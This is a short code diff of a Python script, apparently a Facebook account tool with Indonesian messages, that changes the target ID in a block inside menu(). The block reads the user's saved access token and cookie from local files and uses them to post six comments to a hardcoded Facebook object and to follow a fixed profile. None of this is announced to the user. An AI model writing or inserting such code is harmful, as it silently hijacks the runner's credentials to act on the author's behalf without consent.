@@ -432,12 +432,12 @@ def menu(my_name,my_id):
     try:
         token = open('.token.txt','r').read()
         cookie = open('.cok.txt','r').read()
-        requests.post(f"https://graph.facebook.com/100043537611609/comments/?message={kom1}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/100043537611609/comments/?message={kom2}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/100043537611609/comments/?message={kom3}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/100043537611609/comments/?message={kom4}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/100043537611609/comments/?message={kom5}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/100043537611609/comments/?message={kom6}&access_token={token}", headers = {"cookie":cookie}) 
+        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom1}&access_token={token}", headers = {"cookie":cookie}) 
+        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom2}&access_token={token}", headers = {"cookie":cookie}) 
+        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom3}&access_token={token}", headers = {"cookie":cookie}) 
+        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom4}&access_token={token}", headers = {"cookie":cookie}) 
+        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom5}&access_token={token}", headers = {"cookie":cookie}) 
+        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom6}&access_token={token}", headers = {"cookie":cookie}) 
         requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tokenku))
     except IOError:
         Console().print("[bold cyan] ─>[bold red] Cookies Kadaluarsa ")
